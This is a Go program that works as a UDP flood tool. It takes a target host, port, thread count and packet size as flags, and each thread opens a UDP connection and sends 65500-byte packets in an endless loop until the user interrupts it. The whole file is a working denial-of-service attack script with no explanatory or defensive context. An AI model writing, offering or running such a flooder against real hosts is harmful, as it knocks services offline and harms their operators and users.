package main

import (
	"flag"
	"fmt"
	"net"
	"os"
	"os/signal"
	"syscall"
)

var (
	_host    = flag.String("h", "", "Specify Host")
	_port    = flag.Int("p", 0, "Specify Port")
	_threads = flag.Int("t", 5, "Specify threads")
	_size    = flag.Int("s", 65500, "Packet Size")
)

func main() {
	flag.Parse()

	fullAddr := fmt.Sprintf("%s:%v", *_host, *_port)

	fmt.Println(_host, _port, _size, _threads)

	//Create send buffer
	buf := make([]byte, *_size)

	fmt.Printf(":-( %s\n", fullAddr)
	for i := 0; i < *_threads; i++ {
		//Establish udp
		conn, err := net.Dial("udp", fullAddr)
		if err != nil {
			fmt.Println(err)
		}
		go func() {
			for {
				conn.Write(buf)
			}
		}()

	}

	ctlc := make(chan os.Signal)
	signal.Notify(ctlc, syscall.SIGINT, syscall.SIGKILL, syscall.SIGTERM)
	<-ctlc
	fmt.Println("\r\n-- Interrupted by user --        \n")
	os.Exit(0)

	//Sleep forever
	<-make(chan bool, 1)

}
